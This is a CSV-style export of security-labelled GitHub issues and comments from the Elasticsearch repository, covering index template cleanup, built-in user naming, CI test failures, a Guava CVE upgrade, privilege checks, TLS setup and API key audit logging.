Thanks for filing @PhaedrusTheGreek ! We have historically referred to this as ""Cell Level Security"", which is what some other systems call it.  

This is the ability to grant or deny access to a given field, based on the value of some other field in that document.

In this case case, you want to grant access to `all fields`, if `type == X`, and grant access to `user.*` if `type == Y`. 
",no,">feature,:Security/Authorization,Team:Security,"
elastic/elasticsearch,407935800,"Older .security template not cleaned up","With a `5.6.9` elasticsearch upgraded to `6.4.2`, we do not cleanup older templates. In the `6.4.2` cluster, it had the `5.6.9` template (`security-index-template-v6`) . Both the new and old template have the same `order`. If you were to reindex the `.security` index, the older template's settings take priority.

<details>
  <summary>Older template</summary>

``` json
  ""security-index-template-v6"" : {
    ""order"" : 1000,
    ""index_patterns"" : [
      "".security-*""
    ],
    ""settings"" : {
      ""index"" : {
        ""format"" : ""6"",
        ""analysis"" : {
          ""filter"" : {
            ""email"" : {
              ""type"" : ""pattern_capture"",
              ""preserve_original"" : ""true"",
              ""patterns"" : [
                ""([^@]+)"",
                ""(\\p{L}+)"",
                ""(\\d+)"",
                ""@(.+)""
              ]
            }
          },
          ""analyzer"" : {
            ""email"" : {
              ""filter"" : [
                ""email"",
                ""lowercase"",
                ""unique""
              ],
              ""tokenizer"" : ""uax_url_email""
            }
          }
        },
        ""number_of_shards"" : ""1"",
        ""priority"" : ""1000"",
        ""auto_expand_replicas"" : ""0-all"",
        ""number_of_replicas"" : ""0""
      }
    },
    ""mappings"" : {
      ""doc"" : {
        ""_meta"" : {
          ""security-version"" : ""5.6.9""
        },
        ""dynamic"" : ""strict"",
        ""properties"" : {
          ""username"" : {
            ""type"" : ""keyword""
          },
          ""roles"" : {
            ""type"" : ""keyword""
          },
          ""password"" : {
            ""type"" : ""keyword"",
            ""index"" : false,
            ""doc_values"" : false
          },
          ""full_name"" : {
            ""type"" : ""text""
          },
          ""email"" : {
            ""type"" : ""text"",
            ""analyzer"" : ""email""
          },
          ""metadata"" : {
            ""type"" : ""object"",
            ""dynamic"" : true
          },
          ""enabled"" : {
            ""type"" : ""boolean""
          },
          ""cluster"" : {
            ""type"" : ""keyword""
          },
          ""indices"" : {
            ""type"" : ""object"",
            ""properties"" : {
              ""field_security"" : {
                ""properties"" : {
                  ""grant"" : {
                    ""type"" : ""keyword""
                  },
                  ""except"" : {
                    ""type"" : ""keyword""
                  }
                }
              },
              ""names"" : {
                ""type"" : ""keyword""
              },
              ""privileges"" : {
                ""type"" : ""keyword""
              },
              ""query"" : {
                ""type"" : ""keyword""
              }
            }
          },
          ""name"" : {
            ""type"" : ""keyword""
          },
          ""run_as"" : {
            ""type"" : ""keyword""
          },
          ""doc_type"" : {
            ""type"" : ""keyword""
          },
          ""type"" : {
            ""type"" : ""keyword""
          },
          ""expiration_time"" : {
            ""type"" : ""date"",
            ""format"" : ""epoch_millis""
          },
          ""rules"" : {
            ""type"" : ""object"",
            ""dynamic"" : true
          }
        }
      }
    },
    ""aliases"" : { }
  }
```
</details>

<details>
  <summary>Newer template</summary>

``` json
""security-index-template"" : {
    ""order"" : 1000,
    ""index_patterns"" : [
      "".security-*""
    ],
    ""settings"" : {
      ""index"" : {
        ""format"" : ""6"",
        ""analysis"" : {
          ""filter"" : {
            ""email"" : {
              ""type"" : ""pattern_capture"",
              ""preserve_original"" : ""true"",
              ""patterns"" : [
                ""([^@]+)"",
                ""(\\p{L}+)"",
                ""(\\d+)"",
                ""@(.+)""
              ]
            }
          },
          ""analyzer"" : {
            ""email"" : {
              ""filter"" : [
                ""email"",
                ""lowercase"",
                ""unique""
              ],
              ""tokenizer"" : ""uax_url_email""
            }
          }
        },
        ""number_of_shards"" : ""1"",
        ""priority"" : ""1000"",
        ""auto_expand_replicas"" : ""0-all"",
        ""number_of_replicas"" : ""0""
      }
    },
    ""mappings"" : {
      ""doc"" : {
        ""_meta"" : {
          ""security-version"" : ""6.4.2""
        },
        ""dynamic"" : ""strict"",
        ""properties"" : {
          ""username"" : {
            ""type"" : ""keyword""
          },
          ""roles"" : {
            ""type"" : ""keyword""
          },
          ""password"" : {
            ""type"" : ""keyword"",
            ""index"" : false,
            ""doc_values"" : false
          },
          ""full_name"" : {
            ""type"" : ""text""
          },
          ""email"" : {
            ""type"" : ""text"",
            ""analyzer"" : ""email""
          },
          ""metadata"" : {
            ""type"" : ""object"",
            ""dynamic"" : true
          },
          ""enabled"" : {
            ""type"" : ""boolean""
          },
          ""cluster"" : {
            ""type"" : ""keyword""
          },
          ""indices"" : {
            ""type"" : ""object"",
            ""properties"" : {
              ""field_security"" : {
                ""properties"" : {
                  ""grant"" : {
                    ""type"" : ""keyword""
                  },
                  ""except"" : {
                    ""type"" : ""keyword""
                  }
                }
              },
              ""names"" : {
                ""type"" : ""keyword""
              },
              ""privileges"" : {
                ""type"" : ""keyword""
              },
              ""query"" : {
                ""type"" : ""keyword""
              }
            }
          },
          ""applications"" : {
            ""type"" : ""object"",
            ""properties"" : {
              ""application"" : {
                ""type"" : ""keyword""
              },
              ""privileges"" : {
                ""type"" : ""keyword""
              },
              ""resources"" : {
                ""type"" : ""keyword""
              }
            }
          },
          ""application"" : {
            ""type"" : ""keyword""
          },
          ""global"" : {
            ""type"" : ""object"",
            ""properties"" : {
              ""application"" : {
                ""type"" : ""object"",
                ""properties"" : {
                  ""manage"" : {
                    ""type"" : ""object"",
                    ""properties"" : {
                      ""applications"" : {
                        ""type"" : ""keyword""
                      }
                    }
                  }
                }
              }
            }
          },
          ""name"" : {
            ""type"" : ""keyword""
          },
          ""run_as"" : {
            ""type"" : ""keyword""
          },
          ""doc_type"" : {
            ""type"" : ""keyword""
          },
          ""type"" : {
            ""type"" : ""keyword""
          },
          ""actions"" : {
            ""type"" : ""keyword""
          },
          ""expiration_time"" : {
            ""type"" : ""date"",
            ""format"" : ""epoch_millis""
          },
          ""creation_time"" : {
            ""type"" : ""date"",
            ""format"" : ""epoch_millis""
          },
          ""rules"" : {
            ""type"" : ""object"",
            ""dynamic"" : true
          },
          ""refresh_token"" : {
            ""type"" : ""object"",
            ""properties"" : {
              ""token"" : {
                ""type"" : ""keyword""
              },
              ""refreshed"" : {
                ""type"" : ""boolean""
              },
              ""invalidated"" : {
                ""type"" : ""boolean""
              },
              ""client"" : {
                ""type"" : ""object"",
                ""properties"" : {
                  ""type"" : {
                    ""type"" : ""keyword""
                  },
                  ""user"" : {
                    ""type"" : ""keyword""
                  },
                  ""realm"" : {
                    ""type"" : ""keyword""
                  }
                }
              }
            }
          },
          ""access_token"" : {
            ""type"" : ""object"",
            ""properties"" : {
              ""user_token"" : {
                ""type"" : ""object"",
                ""properties"" : {
                  ""id"" : {
                    ""type"" : ""keyword""
                  },
                  ""expiration_time"" : {
                    ""type"" : ""date"",
                    ""format"" : ""epoch_millis""
                  },
                  ""version"" : {
                    ""type"" : ""integer""
                  },
                  ""metadata"" : {
                    ""type"" : ""object"",
                    ""dynamic"" : true
                  },
                  ""authentication"" : {
                    ""type"" : ""binary""
                  }
                }
              },
              ""invalidated"" : {
                ""type"" : ""boolean""
              },
              ""realm"" : {
                ""type"" : ""keyword""
              }
            }
          }
        }
      }
    },
    ""aliases"" : { }
  }
```
</details>","Pinging @elastic/es-security",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,317448131,"Change built-in `kibana` user to `kibana_system`","*Original comment by @skearns64:*

Today, we have 3 built-in users: `elastic`, a superuser account, `kibana` the system account that the Kibana server uses for connecting to ES, setting up the .kibana index and pushing monitoring data, and `logstash_system`, an account for logstash monitoring. 

Both the `kibana` user and the `logstash_system` users are system accounts that the respective systems use. It's a bit confusing and inconsistent that they don't follow the same naming scheme. There have been a number of cases where customers and users have mistaken the `kibana` user for an end-user account for logging into Kibana. 

I propose that we change the `kibana` user to `kibana_system` for consistency. 

Alternatively, I would also be comfortable changing `logstash_system` to `logstash` to match `kibana` -  the consistency of the naming scheme is more important to me than the scheme itself. 
","*Original comment by @skearns64:*

cc @epixa @clintongormley *Original comment by @lcawl:*

@epixa noted in LINK REDACTED that if customers use the credentials from the kibana.yml file (i.e. ""kibana"") to log in then ""Kibana wouldn't really function properly"", which is another good reason to make it clear that it's a system account.*Original comment by @epixa:*

++ to this idea.  We have to be careful about how we handle this for backwards compatibility sake, but this will go a long way in helping avoid ambiguity around how this user is used.*Original comment by @skearns64:*

Great, glad there is appetite for this.. 

Is this something that we could fix for 6.0? Given the potential BWC implications, a major version seems like the right time to make the change. *Original comment by @clintongormley:*

@tvernum is there any way of doing this transparently (including during a rolling restart)?*Original comment by @tvernum:*

We renamed the kibana role from kibana to kibana_system with a BWC layer in place. (LINK REDACTED)
I _think_ it's probably possible to do something similar for the user, but I'd need to investigate more thoroughly.
  *Original comment by @skearns64:*

I think this would be a really good one to get into 6.0, if at all possible. Otherwise, we will have to live with inconsistent default usernames for another major release.*Original comment by @jimgoodwin:*

Please discuss solutions...@skearns64 is this still important?Yes, I think that the naming confusion still exists among our customers, so this is still something we should address.OK.  Out of FixItFriday, at least some folks felt it would be better to move logstash_system to be logstash, instead of changing the logstash and kibana users, WDYT?> at least some folks felt it would be better to move logstash_system to be logstash, instead of changing the logstash and kibana users

Please no!
About once a week we have to explain to someone on the forums not to login to Kibana as the `kibana` user. We intentionally tried to solve that problem when we created the `logstash_system` user so that users didn't think it was suitable for use in logstash pipelines. It has helped by not completely.
Related: https://github.com/elastic/elasticsearch/issues/29892

Unassigned myself so security team could get to this faster.",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,317447650,"Document and field level security tests should be REST tests","*Original comment by @jaymode:*

Currently, we have many document and field level security tests that are integration tests, but they really do not need to be. @s1monw pointed out that these tests could be simple REST tests.

",,no,">test,:Security/Security,Team:Security,"
elastic/elasticsearch,1114871153,"[CI] NativePrivilegeStoreCacheTests testRolesCacheIsClearedWhenPrivilegesIsChanged failing","**Build scan:**
https://gradle-enterprise.elastic.co/s/pa4gxjp7b7p3m/tests/:x-pack:plugin:security:internalClusterTest/org.elasticsearch.xpack.security.authz.store.NativePrivilegeStoreCacheTests/testRolesCacheIsClearedWhenPrivilegesIsChanged

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:internalClusterTest' --tests ""org.elasticsearch.xpack.security.authz.store.NativePrivilegeStoreCacheTests.testRolesCacheIsClearedWhenPrivilegesIsChanged"" -Dtests.seed=DD53D6C2208509F7 -Dtests.locale=sr-Latn -Dtests.timezone=US/Mountain -Druntime.java=17`

**Applicable branches:**
8.0

**Reproduces locally?:**
No

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.authz.store.NativePrivilegeStoreCacheTests&tests.test=testRolesCacheIsClearedWhenPrivilegesIsChanged

**Failure excerpt:**
```
org.elasticsearch.ElasticsearchSecurityException: action [cluster:monitor/health] is unauthorized for user [test_role_cache_user] with roles [test_role_cache_role], this action is granted by the cluster privileges [monitor,manage,all]

  at __randomizedtesting.SeedInfo.seed([DD53D6C2208509F7:492D491E0E5C25E6]:0)
  at org.elasticsearch.xpack.core.security.support.Exceptions.authorizationError(Exceptions.java:36)
  at org.elasticsearch.xpack.security.authz.AuthorizationService.denialException(AuthorizationService.java:920)
  at org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.handleFailure(AuthorizationService.java:979)
  at org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:964)
  at org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:923)
  at org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:31)
  at org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:404)
  at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:136)
  at org.elasticsearch.xpack.security.authz.RBACEngine.authorizeClusterAction(RBACEngine.java:172)
  at org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:394)
  at org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:370)
  at org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:255)
  at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:136)
  at org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:31)
  at org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:138)
  at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:136)
  at org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.lambda$buildThenMaybeCacheRole$15(CompositeRolesStore.java:441)
  at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:136)
  at org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.buildRoleFromDescriptors(CompositeRolesStore.java:535)
  at org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.buildThenMaybeCacheRole(CompositeRolesStore.java:417)
  at org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.lambda$roles$3(CompositeRolesStore.java:224)
  at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:136)
  at org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.lambda$loadRoleDescriptorsAsync$19(CompositeRolesStore.java:495)
  at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:136)
  at org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:31)
  at org.elasticsearch.xpack.core.common.IteratingActionListener.onResponse(IteratingActionListener.java:132)
  at org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.lambda$loadRoleDescriptorsAsync$22(CompositeRolesStore.java:518)
  at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:136)
  at org.elasticsearch.xpack.security.authz.store.NativeRolesStore$4.onResponse(NativeRolesStore.java:354)
  at org.elasticsearch.xpack.security.authz.store.NativeRolesStore$4.onResponse(NativeRolesStore.java:350)
  at org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:31)
  at org.elasticsearch.client.node.NodeClient.lambda$executeLocally$0(NodeClient.java:107)
  at org.elasticsearch.tasks.TaskManager$1.onResponse(TaskManager.java:176)
  at org.elasticsearch.tasks.TaskManager$1.onResponse(TaskManager.java:170)
  at org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:31)
  at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$2(SecurityActionFilter.java:169)
  at org.elasticsearch.action.ActionListener$DelegatingFailureActionListener.onResponse(ActionListener.java:219)
  at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction$2.handleResponse(TransportSingleShardAction.java:253)
  at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction$2.handleResponse(TransportSingleShardAction.java:244)
  at org.elasticsearch.transport.TransportService$ContextRestoreResponseHandler.handleResponse(TransportService.java:1333)
  at org.elasticsearch.transport.TransportService$DirectResponseChannel.processResponse(TransportService.java:1411)
  at org.elasticsearch.transport.TransportService$DirectResponseChannel.sendResponse(TransportService.java:1391)
  at org.elasticsearch.transport.TaskTransportChannel.sendResponse(TaskTransportChannel.java:41)
  at org.elasticsearch.action.support.ChannelActionListener.onResponse(ChannelActionListener.java:33)
  at org.elasticsearch.action.support.ChannelActionListener.onResponse(ChannelActionListener.java:16)
  at org.elasticsearch.action.ActionRunnable.lambda$supply$0(ActionRunnable.java:47)
  at org.elasticsearch.action.ActionRunnable$2.doRun(ActionRunnable.java:62)
  at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingAbstractRunnable.doRun(ThreadContext.java:776)
  at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:26)
  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)
  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
  at java.lang.Thread.run(Thread.java:833)

```","Pinging @elastic/es-security (Team:Security)Another occurrence: https://gradle-enterprise.elastic.co/s/mr67ezqxstsw6/tests/:x-pack:plugin:security:internalClusterTest/org.elasticsearch.xpack.security.authz.store.NativePrivilegeStoreCacheTests/testRolesCacheIsClearedWhenPrivilegesIsChanged?top-execution=1

Just a bump. Seeing this continue to happen once or twice a day.I've muted this on the 8.0 branch. Seems to be only failing there.",no,">test-failure,:Security/Authorization,Team:Security,"
elastic/elasticsearch,670142713,"Provide more context around the features lost during license expiration","This relates to #59342. With the additional context that we track around exactly which licensed features are used, leading up to license expiration and at license expiration we can provide users even more context around the licensed features they are losing access to beyond the generic message that we log today (e.g., today we say ""Machine Learning APIs are disabled"" and in the future we could ""Machine Learning APIs are disabled, last used on ${timestamp}"". If we sort these by timestamp, it will give users upfront the most relevant information about the consequences of license expiration in what is otherwise a very long message.","Pinging @elastic/es-security (:Security/License)",no,">enhancement,:Security/License,Team:Security,"
elastic/elasticsearch,857423023,"[CI] Netty4HeadBodyIsEmptyIT testTemplateExists failing with FIPS enabled","This is failing in our FIPS build, it reproduced locally for me with the FIPS flag set.

**Build scan:**
https://gradle-enterprise.elastic.co/s/h3dxshexqrzfi/tests/:modules:transport-netty4:javaRestTest/org.elasticsearch.rest.Netty4HeadBodyIsEmptyIT/testTemplateExists

**Reproduction line:**
`./gradlew ':modules:transport-netty4:javaRestTest' --tests ""org.elasticsearch.rest.Netty4HeadBodyIsEmptyIT.testTemplateExists"" -Dtests.seed=A02E26474C28612C -Dtests.security.manager=true -Dtests.locale=en-GB -Dtests.timezone=Africa/Brazzaville -Druntime.java=11 -Dtests.fips.enabled=true`

**Applicable branches:**
master

**Reproduces locally?:**
Yes

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.rest.Netty4HeadBodyIsEmptyIT&tests.test=testTemplateExists

**Failure excerpt:**
```
org.elasticsearch.client.WarningFailureException: method [PUT], host [http://[::1]:34641], URI [/_template/template], status line [HTTP/1.1 200 OK]
Warnings: [legacy template [template] has index patterns [*] matching patterns from existing composable templates [.deprecation-indexing-template,.slm-history,.watch-history-14,ilm-history,logs,metrics,synthetics] with patterns (.deprecation-indexing-template => [.logs-deprecation.*],.slm-history => [.slm-history-5*],.watch-history-14 => [.watcher-history-14*],ilm-history => [ilm-history-5*],logs => [logs-*-*],metrics => [metrics-*-*],synthetics => [synthetics-*-*]); this template [template] may be ignored in favor of a composable template at index creation time]
{""acknowledged"":true}

  at __randomizedtesting.SeedInfo.seed([A02E26474C28612C:73DFDE5595D75E1F]:0)
  at org.elasticsearch.client.RestClient.convertResponse(RestClient.java:326)
  at org.elasticsearch.client.RestClient.performRequest(RestClient.java:296)
  at org.elasticsearch.client.RestClient.performRequest(RestClient.java:270)
  at org.elasticsearch.rest.Netty4HeadBodyIsEmptyIT.testTemplateExists(Netty4HeadBodyIsEmptyIT.java:128)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
  at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:566)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:824)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:475)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:831)
  at java.lang.Thread.run(Thread.java:834)

```","Pinging @elastic/es-security (Team:Security)Since this reproduces I've muted this test in `master`.This is another re-occurrence of #66820 and the root cause is that we use different distributions in regular and FIPS tests. We have an issue (#70005) for not mandating default distribution for FIPS tests and it should solve this problem for good. In the meantime, we could choose to either mute the test or raise another stop-gap fix.Other occurrences today on 7.x
* https://gradle-enterprise.elastic.co/s/dxb6cnvidytqm
* https://gradle-enterprise.elastic.co/s/e7wwzgosq5eve
* https://gradle-enterprise.elastic.co/s/f6fpotbi7uysa
* https://gradle-enterprise.elastic.co/s/l7bnzc67os5sk
* https://gradle-enterprise.elastic.co/s/y4h5rao47pb44





Cherry-picked Mark's mute from master into 7.x https://github.com/elastic/elasticsearch/commit/8b327465251fff18bbb3a5090354e1492391ad14",no,">test-failure,Team:Security,:Security/FIPS,"
elastic/elasticsearch,421074604,"Upgrade guava dependency","The Guava dependency contains a security flaw in the versions of the library we ship
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10237

While we don't deserialize untrusted input, we should still consider updating this library at some point, the flaw gets triggered by security vulnerability scanners. We appear to ship multiple versions of the package

```
% grep guava elasticsearch-6.7.0-SNAPSHOT.csv
com.google.guava:guava,20.0,https://repo1.maven.org/maven2/com/google/guava/guava/20.0,Apache-2.0
com.google.guava:guava,19.0,https://repo1.maven.org/maven2/com/google/guava/guava/19.0,Apache-2.0
com.google.guava:guava,16.0.1,https://repo1.maven.org/maven2/com/google/guava/guava/16.0.1,Apache-2.0
com.google.guava:guava,11.0.2,https://repo1.maven.org/maven2/com/google/guava/guava/11.0.2,Apache-2.0
```","Pinging @elastic/es-securityHi @elasticjava 
I would like to contribute , and basically I have java skills . I would like to start with this issue , how do I start ? what version of guava dependency do we want to update to ?  ",no,":Security/Security,Team:Security,"
elastic/elasticsearch,594155441,"Feature 30104 deprecate 2x role fmts","Hello,

This is a shot at #30104.

Removed the remaining support for2x role formats from file or native role definitions. Now any role definitions with ""fields"" params should be rejected as invalid.

Unit tests I've modified still pass, but I'm having trouble getting ./gradlew check to pass, even without my changes applied. Runs are taking >30min, I can hear my laptop start working very hard, and I'm getting errors like > Failed to start oldEs1Fixture and > node{:x-pack:plugin:watcher:qa:rest:integTest-0} failed to wait for ports files after 120000 MILLISECONDS (usually one of those, varies per run). Still looking into that - lmk if there are extreme system requirements I might not be meeting (macos 10.12, 16gb ram) or other tips. Thanks.","Pinging @elastic/es-security (:Security/Security)Thank you @benjaminran!  and apologies it took me so long to get to this. I will spin CI tests now and will take a look at the PR in the next couple of days@elasticmachine test this please@elasticmachine update branch@elasticmachine test this please
Thanks for the review, I'll try to get an update out in the next couple days<!-- CLA-CHECK:54770 -->
&#x1F49A; CLA has been signed> Should I force push a correction? 

Not sure how CLA checker will handle this but you can try. Worse case scenario, we'll close this PR and you would need to open a new one :/ 

> LMK if you have more on this. I believe my current revision will log something like 'ElasticsearchParseException: failed to parse indices privileges for role [test]. unexpected field [fields]' onto the elasticsearch host - we could instead log a more helpful message like e.g. ""rejected invalid role; the 2.x field permissions syntax (""fields"": [...]) has been deprecated"", maybe even including a pointer to https://www.elastic.co/guide/en/elasticsearch/reference/current/field-level-security.html or some other migration guide. Or, probably overkill - is there precedent for returning detailed error messages to the client?

We are having an internal discussion about how this should be handled in general. Depending on the outcome, we might need to stall merging this until we have an acceptable solution to protect users from unexpected behaviors when upgrading to 8. I will keep you postedOkay, force pushed with corrected author names, rebased the 3 commits I've made on top of master, no code changes. Sorry about the extra noisePinging @elastic/es-security (Team:Security)",yes,">refactoring,:Security/Security,Team:Security,v8.6.0,"
elastic/elasticsearch,485708147,"Fix check privilege API behavior in case of request/authentication based cluster privileges","There are some edge case scenario's where the `has_privileges` API behaves differently.
We added support for request and/or authentication based predicates for cluster permission.
But when we want to check whether the current user has a cluster privilege we do not take the additional predicates into consideration.
For example, if the user has `manage_own_api_key` privilege then following is the current behavior:
- if the cluster action in the request is `manage_own_api_key` then it will return `true`
- if the cluster action in the request is `cluster:admin/xpack/security/api_key/get` then it returns `false` since we do not know what the request looks like.","Pinging @elastic/es-securityI'm running into this problem now. A user with the `manage_own_api_key` privilege can't call `GET /_security/api_key`. Is there another privilege this user needs?Hi @cjcenizal 
The user with `manage_own_api_key` privilege will be able to retrieve API keys. The cluster action `cluster:admin/xpack/security/api_key/get` is allowed for this user.

But when you query via `_has_privileges` API we do not know whether the user is going to request to retrieve only its own API keys we return `false`.
```
GET /_security/user/_has_privileges
{
  ""cluster"": [""cluster:admin/xpack/security/api_key/get""]
}
```
But if you request with the privilege name like below it would return `true`
```
GET /_security/user/_has_privileges
{
  ""cluster"": [""manage_own_api_key""]
}
```

I hope this is the problem that you are facing when you say 
> A user with the manage_own_api_key privilege can't call GET /_security/api_key. Is there another privilege this user needs?

Does Kibana always query using the cluster action? or is there a way to check using the privilege name? I do not like to suggest this workaround but for time being you can proceed with using the privilege name until we figure some behavior for this scenario. Thank you.We discussed this in the security area meeting.

Our collective view was:
- What we really want to say is _maybe - it depends on the parameters in the request_. But we don't have a way to put that in the response right now.
- Even if we did have a _maybe_ response, it's not clear what consumers would do with that. It wouldn't tell them which requests would be allowed.
- In the absense of _maybe_,`false` is a better behaviour than `true`.
- For `manage_own_api_key` there's an obvious solution that gives the caller the information they want (if you check both `manage_own_api_key` and `cluster:admin/xpack/security/api_key/get`, then you can infer from the response which requests would work).

Given the above, we don't think it's worth trying to do anything with this right now, but are open to looking at it again if there's a valid use case that isn't supported.
 ",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,433056273,"Simplify TLS setup","We know that configuring TLS can be difficult. Although the simplest cases are not too hard, as soon as there are additional constraints (e.g. local site policies, dynamic addressing) things get trickier.

It is often the case that the person configuring Elasticsearch has only a high level understanding of TLS, and is unsure how to chose between various configuration options that we offer, or the security consequences of certain choices.

When a configuration fails, it can be extremely difficult to debug because it is exceptionally rare for the  error messages to provide sufficient details to allow the ES admin to understand the changes that are needed.

As a result we see:
- TLS being a source of frustration for ES admins
- Unintentional security weaknesses being introduced by admins in their efforts to make the cluster work (lax verification modes, overly permissive CA trust) 
- Fragile configurations that interfere with the proper use of other ES features (e.g. TLS configurations that prevent Watcher from calling external services)

We should take steps to make this easier to set up, while recognising
- The ES admin may not know much about low level TLS details or certificate/key types/formats
- The JVM's TLS error messages are pretty much indecipherable to the average user.
- Local sites may have special requirements about tooling, CAs and certificate generation
- Container based deployments change some assumptions around network access and addressing
- Automated deployments (puppet, ansible, etc) should be encouraged, but are likely to change the constraints & expectation around tooling. 
- TLS for the transport interface is required for production deployments (if security is enabled)
- TLS for the Rest (HTTP) interface should be encouraged, and potentially enforced in future versions.
","Pinging @elastic/es-security",no,":Security/TLS,team-discuss,Team:Security,"
elastic/elasticsearch,568018081,"More precise audit logs for actions taken by API Keys","Related: https://github.com/elastic/elasticsearch/issues/52314

At the moment, if an action is authenticated via an API key, the audit logs do not tell the complete story of what happened:
1. The user's principal is the original principal, with no record of the API key id/name
